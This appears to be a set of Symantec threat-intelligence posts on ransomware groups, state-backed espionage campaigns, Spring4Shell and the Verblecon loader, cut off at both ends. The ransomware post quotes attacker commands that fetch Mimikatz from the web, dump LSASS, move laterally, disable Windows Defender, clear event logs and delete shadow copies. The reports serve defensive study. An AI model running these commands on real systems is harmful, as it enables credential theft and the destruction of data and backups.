rnd/dywqmjcdytwkxewrvtqznxgmpmdzyqgulzacxcxx\",\"algo\":[\"cn/1\",\"cn/2\",\"cn/r\",\"cn/fast\",\"cn/half\",\"cn/xao\",\"cn/rto\",\"cn/rwz\",\"cn/zls\",\"cn/double\",\"cn/ccx\",\"rx/0\",\"rx/wow\",\"rx/arq\",\"rx/sfx\",\"rx/keva\",\"argon2/chukwa\",\"argon2/chukwav2\",\"argon2/wrkz\"]}} Additionally, the malware monitors the clipboard for cryptocurrency addresses and replaces them with ones controlled by the attackers. Samples of the Clipminer malware began to appear around January 2021, with the cryptocurrency wallets used by the malware’s operators seeing activity begin in February of the same year. This is just a few months after KryptoCibule was uncovered and blogged about by ESET researchers. While we cannot confirm if Clipminer and KryptoCibule are one and the same, the design similarities are striking. It is possible that following the exposure from ESET’s blog, the KryptoCibule actors may have decided to switch things up and launched Clipminer. Another possibility is that different threat actors may have taken inspiration from KryptoCibule and created Clipminer in its image. However, whatever the truth may be, one thing is clear: Clipminer has proven a successful endeavor, earning its operators a considerable amount of money.

    "text": "Targeted ransomware attacks continue to be one of the most critical cyber risks facing organizations of all sizes. The tactics used by ransomware attackers are continually evolving, but by identifying the most frequently employed tools, tactics, and procedures (TTPs) organizations can gain a deeper understanding into how ransomware groups infiltrate networks and use this knowledge to identify and prioritize areas of weakness. Symantec, a division ofBroadcom Software, tracks various ransomware threats; however, the following three ransomware families are being observed in the majority of recent attacks: Similar to many other ransomware families, Hive, Conti, and Avoslocker follow the ransomware-as-a-service (RaaS) business model. In the RaaS model the ransomware operators hire affiliates who are responsible for launching the ransomware attacks on their behalf. In most cases affiliates stick to a playbook that contains detailed attack steps laid out by the ransomware operators. Once initial access to a victim network has been gained, Hive, Conti, and Avoslocker use a plethora of TTPs to help the operators achieve the following: Affiliates for the Hive, Conti, and Avoslocker ransomware operators use a variety of techniques to gain an initial foothold on victim networks. Some of these techniques include: In most cases, the spear-phishing emails contain Microsoft Word document attachments embedded with macros that lead to the installation of one of the previously mentioned malware threats. In some instances, attackers use this malware to install Cobalt Strike, which is then used to pivot to other systems on the network. These malware threats are then used to distribute ransomware onto compromised computers. After gaining initial access, Symantec has observed affiliates for all three ransomware families using third-party software such as AnyDesk and ConnectWise Control (previously known as ScreenConnect) to maintain access to victim networks. They also enable default Remote Desktop access in the firewall: netsh advfirewall firewall set rule group=\"Remote Desktop\" new enable=yes Actors are also known to create additional users on compromised systems to maintain access. In some instances we have seen threat actors add registry entries that allow them to automatically log in when a machine is restarted: reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultUserName /t REG_SZ /d <user> /f reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon /t REG_SZ /d 1 /f During the discovery phase the ransomware actors try to sweep the victim’s network to identify potential targets. Symantec has observed the aforementioned ransomware actors using tools such as the following: Mimikatz is a go-to tool for most ransomware groups and Hive, Conti, and Avoslocker are no exception. We have observed them using the PowerShell version of Mimikatz as well as the PE version of the tool. There are also instances where the threat actors directly load the PowerShell version of Mimikatz from GitHub repositories: powershell IEX((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/<redacted>/Invoke-Mimikatz.ps1'));Invoke-Mimikatz -DumpCreds In addition to using Mimikatz, the threat actors have also taken advantage of the native rundll32 and comsvcs.dll combination to dump the LSASS memory: rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <process id> lsass.dmp full Adversaries also dump the SECURITY, SYSTEM, and SAM hives and later extract credentials from the dump. In rare occasions they have also been observed using taskmgr.exe to dump the LSASS memory and later using the dump to extract valuable credentials. Attackers employ tools like PsExec, WMI, and BITSAdmin to laterally spread and execute the ransomware on victim networks. We have also observed the attackers using several other techniques to laterally move across networks. psexec -accepteula @ips.txt -s -d -c CSIDL_WINDOWS\\xxx.exe wmic /node:@C:\\share$\\comps1.txt /user:\"user\" /password:\"password\" process call create \"cmd.exe /c bitsadmin /transfer xxx \\\\IP\\share$\\xxx.exe %APPDATA%\\xxx.exe&%APPDATA%\\xxx.exe\" bitsadmin /transfer debjob /download /priority normal hxxp://<IP>/ele.dll CSIDL_WINDOWS\\ele.dll mimikatz.exe \"privilege::debug\" \"sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm hash>\" As with a number of other ransomware families, Hive, Conti, and Avoslocker also tamper with various security products that interfere with their goal. We have observed them meddling with security services using the net, taskkill, and sccommands to disable or terminate them. In some cases they also use tools like PC Hunterto end processes. They have also been seen tampering with various registry entries related to security products, since changes to the registry entries can make those products inoperative. Both Hive and AvosLocker have been observed attempting to disable Windows Defender using the following reg.exe commands. reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f reg.exe delete \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d \"1\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiVirus\" /t REG_DWORD /d \"1\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" /v \"MpEnablePus\" /t REG_DWORD /d \"0\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableBehaviorMonitoring\" /t REG_DWORD /d \"1\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableIOAVProtection\" /t REG_DWORD /d \"1\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableOnAccessProtection\" /t REG_DWORD /d \"1\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRealtimeMonitoring\" /t REG_DWORD /d \"1\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableScanOnRealtimeEnable\" /t REG_DWORD /d \"1\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" /v \"DisableEnhancedNotifications\" /t REG_DWORD /d \"1\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"DisableBlockAtFirstSeen\" /t REG_DWORD /d \"1\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"SpynetReporting\" /t REG_DWORD /d \"0\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"SubmitSamplesConsent\" /t REG_DWORD /d \"0\" /f reg.exe add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderApiLogger\" /v \"Start\" /t REG_DWORD /d \"0\" /f reg.exe add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderAuditLogger\" /v \"Start\" /t REG_DWORD /d \"0\" /f reg.exe delete aHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run” /v “Windows Defender” /f reg.exe delete “HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run” /v “Windows Defender” / Disabling the default Windows firewall is also one of the techniques we have seen being used by these ransomware families: netsh advfirewall set allprofiles state off To cover their tracks on a victim system the actors may also clear the Windows event log: wevtutil.exe cl system wevtutil.exe cl security wevtutil.exe cl application powershell -command \"Get-EventLog -LogName * | ForEach { Clear-EventLog $_. Log }\" Adversaries tend to disable or tamper with operating system settings in order to make it difficult for administrators to recover data. Deleting shadow copies is a common tactic threat actors perform before starting the encryption process. They perform this task by using tools like Vssadmin or WMIC and running one of the following commands: vssadmin.exe delete shadows /all /quiet wmic.exe shadowcopy delete We have also seen BCDEditbeing used to disable automatic system recovery and to ignore failures on boot: bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures bcdedit.exe /set {default} recoveryenabled no In some instances the actors delete the safe mode settings in the registry to stop security product services from starting in safe mode: reg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\<service> /f Attackers commonly exfiltrate critical data from a victim’s environment before encrypting it. They then use the stolen data in an attempt to extort a ransom from victims. We have observed threat actors using the following cloud services to exfiltrate data: We have also seen attackers use the following tools for data exfiltration: The TTPs outlined in this blog are a snapshot of the current ransomware threat landscape. The TTPs used by these threat actors are constantly evolving, with groups continually tweaking their methods in a bid to outmaneuver their targets’ security defenses. As such, organizations need to be vigilant and employ a multi-layered security approach. Symantec Endpoint Protection (SEP) protects against ransomware attacks using multiple static and dynamic technologies. IPSblocksinitial access, persistence, and lateral movement. SEP's Audit Signatures are intended to raise awareness of potentially unwanted traffic on the network. By default, Audit Signatures do not block. Administrators reviewing the logs of IPS events in their network can note these Audit events and decide whether or not to configure the corresponding Audit Signatures to block the traffic. The following is a list of Audit Signatures that can be enabled to block, through policies, activity related to the use of software or tools such as AnyDesk, ScreenConnect, and PsExec. Symantec recommends that you have intrusion prevention enabled on all your devices including servers. Symantec Adaptive Protectioncan help protect against lateral movement and ransomware execution techniques used by an attacker. If you are not using tools like PsExec, WMIC, and BITSAdmin in your environment then you should “Deny” these applications and actions using Symantec Adaptive Protection policies.

    "text": "The North Korean-linked Stonefly group is continuing to mount espionage attacks against highly specialized engineering companies with a likely goal of obtaining sensitive intellectual property. Stonefly specializes in mounting highly selective targeted attacks against targets that could yield intelligence to assist strategically important sectors such as energy, aerospace, and military equipment. Virtually all of the technologies it appears to be interested in have military as well as civilian uses and some could have applications in the development of advanced weaponry. Stonefly (aka DarkSeoul, BlackMine, Operation Troy, and Silent Chollima) first came to notice in July 2009, when it mounted distributed denial-of-service (DDoS) attacks against a number of South Korean, U. S. government, and financial websites. It reappeared again in 2011, when it launched more DDoS attacks, but also revealed an espionage element to its attacks when it was found to be using a sophisticated backdoor Trojan (Backdoor. Prioxer) against selected targets. In March 2013, the group was linked to the Jokra (Tojan. Jokra) disk-wiping attacks against a number of South Korean banks and broadcasters. Three months later, the group was involved in a string ofDDoS attacks against South Korean government websites. In recent years, the group’s capabilities have grown markedly and, since at least 2019 Symantec has seen its focus shift solely to espionage operations against select, high-value targets. It now appears to specialize in targeting organizations that hold classified or highly sensitive information or intellectual property. Stonefly’s operations appear to be part of a broader North Korean-sponsored campaign to acquire information and intellectual property, with Operation Dream Job, a more wider-ranging trawl across multiple sectors, being carried out by another North Korean group, Pompilus. The most recent attack discovered by Symantec, a division ofBroadcom Software, was against an engineering firm that works in the energy and military sectors. The attackers breached the organization in February 2022, most likely by exploiting theLog4j vulnerability(CVE-2021-44228) vulnerability on a public-facing VMware View server. The attackers then moved across the network and compromised 18 other computers. 17 hours later:Shortly after compromising the initial server, the attackers installed an updated version of Stonefly’s Backdoor. Preft malware (aka Dtrack, Valefor). The attackers then used a masqueraded version (file name: pvhost.exe) ofPuTTY’s PSCP command line application, presumably to exfiltrate data from the infected machine. Shortly after PSCP was executed, the credential-dumping tool Mimikatz (masquerading under the file name pl.exe) was run. Day 2: Malicious activity resumed when3proxy tiny proxy server, a publicly available proxy tool (file name: svhost.exe) was executed. Use of this tool continued for the next four days. A second suspected proxy tool was installed two days into this four day period (file name: tapi.exe). Several hours afterwards, a copy of the Preft backdoor (file name: svchost.exe) was installed. Two days later,WinSCP, an open-source SSH file-transfer tool was used, presumably to exfiltrate or upload data to the compromised computer. Day 3:The next phase of the intrusion began on the following day, when Preft was executed and the attackers began moving latterly across the organization’s network, usingInvoke-TheHash, a publicly available PowerShell pass-the-hash utility (file name: rev.ps1), and wmiexec.py,a publicly available Impacket toolused to run WMI commands (file name: notepad.exe). The attackers used an updated version of Stonefly’s custom Preft backdoor. Analysis of the backdoor revealed that it is a multistage tool: Stage 1 is the main binary. A python script is used to unpack the binary and shellcode. Stage 2 is shellcode. It performs the following actions: Stage 3 is more shellcode. Stage 4 is the payload. It is an HTTP remote access tool (RAT) that supports various commands, including: The malware can support four different kinds of plugins: executable files, VBS, BAT, and shellcode. It supports three different persistence modes: Startup_LNK, Service, Registry, and Task Scheduler. Along with the Preft backdoor, Stonefly also deployed what appears to be a custom developed information stealer (infostealer). Analysis of this malware revealed that it is a three-staged threat. The main binary extracts and decrypts the encrypted shellcode with a modified RC4 algorithm. Stage 2 is shellcode which retrieves the payload and decrypts it with the same modified RC4 algorithm. The decrypted payload is an executable file that is loaded in-memory. It is designed to search the infected computer for files using pre-configured parameters. These are then copied to temporary files before being copied to a single .zip file and the temporary files are removed. The ZIP file path is %TEMP/~[XXXXXXXX].tmp, where XXXXXXXX is a simple hash of the computer name (eight uppercase hex digits). Curiously, this ZIP file is not automatically exfiltrated. It is possible that the exfiltration functionality was removed and the attackers planned to use an alternative means of exfiltration. While Stonefly’s tools and tactics continue to evolve, there are some common threads between this recent activity and previous attacks, such as its ongoing development of the Preft backdoor and heavy reliance on open-source tools. The group’s capabilities and its narrow focus on acquiring sensitive information make it one of the most potent North Korean cyber threat actors operating today.

    "text": "The Russian-linked Shuckworm espionage group (aka Gamaredon, Armageddon) is continuing to mount an intense cyber campaign against organizations in Ukraine. Shuckworm has almost exclusively focused its operations on Ukraine since it first appeared in 2014. These attacks have continued unabated since the Russian invasion of the country. While the group’s tools and tactics are simple and sometimes crude, the frequency and persistence of its attacks mean that it remains one of the key cyber threats facing organizations in the region. One of the hallmarks of the group’s recent activity is the deployment of multiple malware payloads on targeted computers. These payloads are usually different variants of the same malware (Backdoor. Pterodo), designed to perform similar tasks. Each will communicate with a different command-and-control (C&C) server. The most likely reason for using multiple variants is that it may provide a rudimentary way of maintaining persistence on an infected computer. If one payload or C&C server is detected and blocked, the attackers can fall back on one of the others and roll out more new variants to compensate. Symantec’s Threat Hunter Team, part ofBroadcom Software, has found four distinct variants of Pterodo being used in recent attacks. All of them are Visual Basic Script (VBS) droppers with similar functionality. They will drop a VBScript file, use Scheduled Tasks (shtasks.exe) to maintain persistence, and download additional code from a C&C server. All of the embedded VBScripts were very similar to one another and used similar obfuscation techniques. This variant is a modified self-extracting archive, containing obfuscated VBScripts in resources that can be unpacked by 7-Zip. It then adds them as a scheduled task to ensure persistence: The script also copies itself to [USERPROFILE]\\ntusers.ini file. The two newly created files are more obfuscated VBScripts. This variant is also designed to drop VBScripts on the infected computer. When run, it will first engage in API hammering, making multiple meaningless API calls, which is presumably an attempt to avoid sandbox detection. It will then unpack a script and a file called offspring.gif to C:\\Users\\[username]\\. It will call the script with: This script runs ipconfig /flushdns and executes the offspring.gif file. Offsprint.gif will download a PowerShell script from a random subdomain of corolain.ru and execute it: This variant is another VBScript dropper. It will create two files: It executes them with the following command: Similar to the other variants, the first script will run ipconfig /flushdns before calling the second script and removing the original executable. The second script has two layers of obfuscation, but in the end it downloads the final payload from the domain declined.delivered.maizuko[.]ru and executes it. The final variant is functionally very similar to variants B and C, engaging in API hammering before extracting two VBScript files to the user’s home directory. Script obfuscation is very similar to other variants. While the attackers have made heavy use of Pterodo during recent weeks, other tools have also been deployed alongside it. These include UltraVNC, an open-source remote-administration/remote-desktop-software utility. UltraVNC has previously been used by Shuckworm in multiple attacks. In addition to this, Shuckworm has also been observed using Process Explorer, a Microsoft Sysinternals tool designed to provide information about which handles and DLL processes have opened or loaded. While Shuckworm is not the most tactically sophisticated espionage group, it compensates for this in its focus and persistence in relentlessly targeting Ukrainian organizations. It appears that Pterodo is being continuously redeveloped by the attackers in a bid to stay ahead of detection. While Shuckworm appears to be largely focused on intelligence gathering, its attacks could also potentially be a precursor to more serious intrusions, if the access it acquires to Ukrainian organizations is turned over to other Russian-sponsored actors.

    "text": "Symantec, a division ofBroadcom Software, has observed the North Korea-linked advanced persistent threat (APT) group known as Lazarus conducting an espionage campaign targeting organizations operating within the chemical sector. The campaign appears to be a continuation of Lazarus activity dubbed Operation Dream Job, which was first observed in August 2020. Symantec tracks this sub-set of Lazarus activity under the name Pompilus. Operation Dream Job involves Lazarus using fake job offers as a means of luring victims into clicking on malicious links or opening malicious attachments that eventually lead to the installation of malware used for espionage. Past Dream Job campaigns have targeted individuals in the defense, government, and engineering sectors in activity observed inAugust 2020andJuly 2021. In January 2022, Symantec detected attack activity on the networks of a number of organizations based in South Korea. The organizations were mainly in the chemical sector, with some being in the information technology (IT) sector. However, it is likely the IT targets were used as a means to gain access to chemical sector organizations. There is sufficient evidence to suggest that this recent activity is a continuation of Operation Dream Job. That evidence includes file hashes, file names, and tools that were observed in previous Dream Job campaigns. A typical attack begins when a malicious HTM file is received, likely as a malicious link in an email or downloaded from the web. The HTM file is copied to a DLL file called scskapplink.dll and injected into the legitimate system management software INISAFE Web EX Client. The scskapplink.dll file is typically a signed Trojanized tool with malicious exports added. The attackers have been observed using the following signatures: DOCTER USA, INC and \"A\" MEDICAL OFFICE, PLLC Next, scskapplink.dll downloads and executes an additional payload from a command-and-control (C&C) server with the URL parameter key/values \"prd_fld=racket\". This step kicks off a chain of shellcode loaders that download and execute arbitrary commands from the attackers, as well as additional malware, which are usually executed from malicious exports added to Trojanized tools such as the Tukaani project LZMA Utils library (XZ Utils). The attackers move laterally on the network using Windows Management Instrumentation (WMI) and inject into MagicLine by DreamSecurity on other machines. In some instances, the attackers were spotted dumping credentials from the registry, installing a BAT file in a likely effort to gain persistence, and using a scheduled task configured to run as a specific user. The attackers were also observed deploying post-compromise tools, including a tool used to take screenshots of web pages viewed on the compromised machine at set intervals (SiteShoter). They were also seen using an IP logging tool (IP Logger), a protocol used to turn computers on remotely (WakeOnLAN), a file and directory copier (FastCopy), and the File Transfer Protocol (FTP) executed under the MagicLine process. The following is a case study detailing step-by-step attacker activity on an organization in the chemical sector. 00:51 –A malicious HTM file is received: The HTM file is copied to a DLL file: This DLL file is injected into the legitimate system management software INISAFE Web EX Client. The file is a signed Trojanized version of the ComparePlus plugin for Notepad++ with malicious exports added. 01:02 –The file is run and downloads and executes a backdoor payload (final.cpl - 5f20cc6a6a82b940670a0f89eda5d68f091073091394c362bfcaf52145b058db) from a command-and-control (C&C) server with the URL parameter key/values \"prd_fld=racket\". The file final.cpl is a Trojanized version of the Tukaani project LZMA Utils library (XZ Utils) with a malicious export added (AppMgmt). The malware connects to, downloads, decodes, and executes shellcode from the following remote location: 01:04 –Another CPL file (61e305d6325b1ffb6de329f1eb5b3a6bcafa26c856861a8200d717df0dec48c4) is executed. This file, again, is a Trojanized version of LZMA Utils with a malicious added export. 01:13 –The shellcode loader (final.cpl) is executed again several times. 01:38 –Commands are executed to dump credentials from the SAM and SYSTEM registry hives. Over the next several hours, the attackers run unknown shellcode via final.cpl at various intervals, likely to collect the dumped system hives, among other things. 06:41 –The attackers create a scheduled task to ensure persistence between system reboots: The scheduled task instructs the system to execute 'Intel.bat' as user ‘[REDACTED].help/175287’ starting at 15:42 then every minute under the scheduled task name ‘arm’. It's unclear if this was an account that was cracked via the dumped registry hives or an account the attackers were able to create with admin rights. The attackers were also observed installing Cryptodome (PyCrypto fork) Python encryption modules via CPL files. A clean installation of BitDefender was also installed by the attackers. While unconfirmed, the threat actors may have installed an older version of this software (from 2020) with avulnerability that allowed attackers to run arbitrary commands remotely. 00:21 –The final.cpl file is executed again. 00:49 –A new CPL file called wpm.cpl (942489ce7dce87f7888322a0e56b5e3c3b0130e11f57b3879fbefc48351a78f6) is executed. This file contains, and connects to, a list of IP addresses and records whether the connections were successful. 01:11 –Again, the final.cpl shellcode loader is executed multiple times, executing some unknown shellcode. This activity continued intermittently until 23:49. 23:49 –The file name of the CPL file changes to 'ntuser.dat'. The file location and command-line arguments remain the same. 00:24 –The CPL shellcode loader files (final.cpl and ntuser.dat) are executed multiple times. 00:28 –The attackers create a scheduled task on another machine, likely to ensure persistence: The command is used to schedule a task named 'arm' to run the file 'arm.bat' starting at at 09:28 then every minute after that under the user account '[REDACTED]\\i21076'. 00:29 –A file named arm.dat (48f3ead8477f3ef16da6b74dadc89661a231c82b96f3574c6b7ceb9c03468291) is executed with the following command line arguments: The arm.dat file is a tool used to take screenshots of web pages viewed on the compromised machine every 10 seconds (SiteShoter), as determined by the command line arguments. The screenshots are saved in appdata\\local with the date at the top of the file. 06:50 –The shellcode loader (final.cpl) is executed several times. 07:34 –A new CPL file named addins.cpl (5f20cc6a6a82b940670a0f89eda5d68f091073091394c362bfcaf52145b058db) is executed multiple times, which again is another shellcode loader and has the same command line arguments as seen with final.cpl: 07:39 –A scheduled task is created: The task is used to auto-start and execute addins.bat each time the system is booted. The task uses the service name 'uso' (a file name previously used in older Dream Job campaigns targeting security researchers). The attacker runs addins.cpl again to run a command to start the service and then delete the service directly after: The following commands were then executed to collect information pertaining to network configuration, current user the attackers are logged in as, active users on the machine, available shared drives, and the contents of the 'addins' directory. 07:41 –The file addins.cpl is executed again multiple times before a scheduled task is created to run addins.bat again, start the service, and immediately delete the service: The attackers execute addins.cpl again with the same command line as before. No further activity is observed. The Lazarus group is likely targeting organizations in the chemical sector to obtain intellectual property to further North Korea’s own pursuits in this area. The group’s continuation of Operation Dream Job, as witnessed by Symantecand others, suggests that the operation is sufficiently successful. As such, organizations should ensure they have adequate security in place and remain vigilant for attacks such as this. As always, users should be wary of clicking links or downloading files even if they come from seemingly trustworthy sources.

    "text": "A Chinese state-backed advanced persistent threat (APT) group is attacking organizations around the globe in a likely espionage campaign that has been ongoing for several months. Victims in this Cicada (aka APT10) campaign include government, legal, religious, and non-governmental organizations (NGOs) in multiple countries around the world, including in Europe, Asia, and North America. The wide number of sectors and geographies of the organizations targeted in this campaign is interesting. Cicada’s initial activity several years ago was heavily focused on Japanese-linked companies, though in more recent times it has been linked to attacks on managed service providers (MSPs) with a more global footprint. However, this campaign does appear to indicate a further widening of Cicada’s targeting. The attribution of this activity to Cicada is based on the presence on victim networks of a custom loader and custom malware that are believed to be exclusively used by the APT group. While Cicada has been linked to espionage-style operations dating back to 2009, the earliest activity in this current campaign occurred in mid-2021, with the most recent activity seen in February 2022, so this is a long-running attack campaign that may still be ongoing, researchers from Symantec, a division ofBroadcom, have found. In several cases, the initial activity on victim networks is seen on Microsoft Exchange Servers, suggesting the possibility that a known, unpatched vulnerability in Microsoft Exchange may have been used to gain access to victim networks in some cases. Once the attackers have successfully gained access to victim machines we observe them deploying various different tools, including a custom loader and the Sodamaster backdoor. The loader deployed in this campaign was also deployed in a previous Cicada attack. Sodamaster is a known Cicada tool that is believed to be exclusively used by this group. It is a fileless malware that is capable of multiple functions, including evading detection in a sandbox by checking for a registry key or delaying execution; enumerating the username, hostname, and operating system of targeted systems; searching for running processes, and downloading and executing additional payloads. It is also capable of obfuscating and encrypting traffic that it sends back to its command-and-control (C&C) server. It is a powerful backdoor that Cicada has been using since at least 2020. In this campaign, the attackers are also seen dumping credentials, including by using a custom Mimikatz loader. This version of Mimikatz drops mimilib.dll to obtain credentials in plain text for any user that is accessing the compromised host and provides persistence across reboots. The attackers also exploit the legitimate VLC Media Player by launching a custom loader via the VLC Exports function, and use the WinVNC tool for remote control of victim machines. Other tools utilized in this attack campaign include: The victims in this campaign appear to primarily be government-related institutions or NGOs, with some of these NGOs working in the fields of education and religion. There were also victims in the telecoms, legal, and pharmaceutical sectors. The victims are spread through a wide number of regions including the U. S., Canada, Hong Kong, Turkey, Israel, India, Montenegro, and Italy. There is also just one victim in Japan, which is notable due to Cicada’s previous strong focus on Japanese-linked companies. The attackers spent as long as nine months on the networks of some victims. The victims targeted, the various tools deployed in this campaign, and what we know of Cicada’s past activity all indicate that the most likely goal of this campaign is espionage. Cicada activity waslinked by U. S. government officials to the Chinese governmentin 2018. This is a long-running campaign from a sophisticated and experienced nation-state-backed actor that may still be ongoing, as the most recent activity we saw in this campaign was in February 2022. The targeting of multiple large organizations in different geographies at the same time would require a lot of resources and skills that are generally only seen in nation-state backed groups, and shows that Cicada still has a lot of firepower behind it when it comes to its cyber activities.

    "text": "UPDATE, April 1, 2022:Updated with additional protection information A zero-day vulnerability in the Spring Core Java framework that could allow for unauthenticated remote code execution (RCE) on vulnerable applications was publicly disclosed on March 30, before a patch was released. It was dubbed Spring4Shell. Yes, Symantec products will guard against exploit attempts with the following detections: Data Center Security (DCS) Intrusion Prevention (with default policies) provides zero-day protection against exploitation of the Spring4Shell vulnerability. Spring has now released Spring Framework 5.3.18 and 5.2.20, which it says address the vulnerability. Spring Boot 2.6.6 and 2.5.12 that depend on Spring Framework 5.3.18 have also been released. Temporary remediation stepswere also published by researchers at Praetorian prior to the updates being released. Springalso published suggested workarounds in its blog. A CVE report for the vulnerability was also published this afternoon and given the designationCVE-2022-22965, and assessed as being “high severity.” There appears to have been confusion about the potential severity of Spring4Shell. While it was initially reported that all versions of Spring Core with the JDK version greater than or equal to 9.0 were vulnerable to it, researcherssubsequently determinedthat it appears Spring Coremust be configured in a certain wayto be vulnerable. In itsvulnerability report, Spring itself stated that for the “specific exploit” to work, an application must meet the following prerequisites: “If the application is deployed as a Spring Boot executable jar, i.e. the default, it is not vulnerable to the exploit,” the advisory reads. However, it did also say that “the nature of the vulnerability is more general, and there may be other ways to exploit it.” Given these prerequisites, it’s not clear how many instances of the Spring Core Java framework may be vulnerable to this bug. Proof-of-concept exploit code for Spring4Shell was leaked on GitHub shortly after it was discovered and before a patch was issued. The code was swiftly removed, but not before it was downloaded by several security researchers who confirmed the vulnerability. It was also reposted on various platforms, meaning it was available to the public, including malicious actors. Ithas been reported that Spring4Shell was being actively exploitedin attacks. Spring4Shell is a bug in Spring Core, a popular application framework that allows software developers to quickly and easily develop Java applications with enterprise-level features. These applications can then be deployed on servers, such as Apache Tomcat, as stand-alone packages with all the required dependencies. The bug allows an unauthenticated attacker to execute arbitrary code on a vulnerable system. In a blog published on Thursday(March 31), Spring revealed that the Spring4Shell bug was reported to VMware (which owns Spring) by researchers from AntGroup FG on Tuesday, with the team intending to release emergency patches for the bug on Thursday, but details of the bug were leaked online on Wednesday. No, CVE-2022-22963 is a different bug in the Spring Cloud Function, which is a separate Java library from Spring Core. An advisory for this bugwas published on March 29and patches are available for it. While the naming of the vulnerability appears to have been inspired by theLog4Shell vulnerability that was discovered in December 2021, it is not clear if the impact of this bug will be as significant. We will update this blog with any new relevant information as we get it. For the latest protection updates, please visit theSymantec Protection Bulletin.

    "text": "An unknown attacker is using a complex and powerful new malware loader in relatively unsophisticated and low-reward attacks, indicating they may not realize the potential capabilities of the malware they are deploying. The malware, Trojan. Verblecon, is being used in attacks that appear to have installing cryptocurrency miners on infected machines as their end goal. There are some indications the attacker may also be interested in stealing access tokens for chat app Discord. However, the capabilities of this malware indicate that it could be highly dangerous if leveraged in ransomware or espionage campaigns. Verblecon was first spotted by analysts from Symantec, a division ofBroadcom Software, in January 2022. This blog will detail the capabilities of the malware. The malware is loaded as a server-side polymorphic JAR file. The fact that the file is polymorphic means that, due to encryption and obfuscation, the code of the malware payload looks different each time it is downloaded. Attackers generally pack malware in this way in an effort to evade detection by security software. The malware samples analyzed by Symantec were fully obfuscated, in the code flow, strings, and symbols. The samples themselves may be based onpublicly available code. Once started, the malware checks its command-line arguments. It requires at least one command-line argument to execute, which could be the infection or campaign ID initially e.g. \"CSIDL_SYSTEM_DRIVE\\program files\\java\\jre1.8.0_301\\bin\\javaw.exe\" -jar \"CSIDL_PROFILE\\appdata\\local\\temp\\rpvbh.jar\" masonkhonsari \"CSIDL_SYSTEM_DRIVE\\program files\\java\\jre1.8.0_301\\bin\\javaw.exe\" -jar \"CSIDL_PROFILE\\appdata\\local\\temp\\rpvbh.jar\" 923ec15ffa4474ca7bf200bfb90e782d Additionally, it also attempts to determine if its own process is being debugged by checking for the following Java command-line arguments: Next, it attempts to detect if it is being opened in a virtual or sandbox environment, which would indicate it is likely being opened on a security researcher’s machine. First, it checks for the following directories: It also obtains the machine MAC address and attempts to check for the following prefixes, which may indicate the file is being opened on a virtual machine: Following those checks, it executes the following command to obtain a list of running processes: It then appears to check these processes against a set list: It then also checks for the following files: Next, it appears to check the user name against the following: Then it executes the following command: It is unclear how the output is processed, however, there are some strings that could be related to this or other registry checks: If satisfied with these checks, it may copy itself as one of the following files: And then create one of the following files to use as a loadpoint: [INFECTION_ID] is computed as follows: Then it periodically attempts to connect to the following URLs: [DGA_NAME] is apparently generated using the following method: The traffic generated by the malware looks like this: The server response appears as the below. Some of the strings in this response indicate that the attacker may be leveraging legitimate Cloudflare infrastructure to host some of their C&C infrastructure. The server response body above is an encrypted blob that contains a URL signed with an RSA key. This blob can be decrypted and validated as follows: The malware then starts communicating with the decoded URL by sending details about the infected computer: The request body contains the following information about the infected machine in encrypted form: The server has been observed to respond as follows: Where the response body can be decrypted as follows: The last term above contains the following string: Some samples of the malware are seen communicating with the following servers: Communication between the malware and servers is over HTTP or HTTPS and this communication appears to culminate with victims being directed to connect to the following: The payload is downloaded from the URL observed earlier: The payload is obfuscated in a similar way to the other samples, and also contains similar techniques to detect the virtualization environment, as well as other functionality. The core functionality is to download and execute a binary blob from the following URL: The blob is decrypted along with *.bin artifacts from the same host. The downloaded blob is then cached on the local filesystem (in re-encrypted form) and injected into %Windows%\\SysWow64\\dllhost.exe for execution. The injection is performed using com.sun.jna and doesn't use usual APIs for injection. The final payload (hardwick.bin) contains the following embedded URL pointing to a configuration file for a cryptocurrency miner: This indicates that the purpose of this activity was to install cryptocurrency mining software on victim machines. The evidence found on victim networks appears to indicate that the goal of the attacker was to install cryptocurrency mining software on victim machines. This would appear to be a relatively low-reward goal for the attacker given the level of effort that would have been required to develop this sophisticated malware. There are also indications that the attacker may be stealing Discord tokens and using these to advertise Trojanized videogame applications. We suspect they were stealing Discord tokens because some of the obfuscated strings refer to pathnames that are apparently related to Discord clients, specifically: Discord is a group chatting 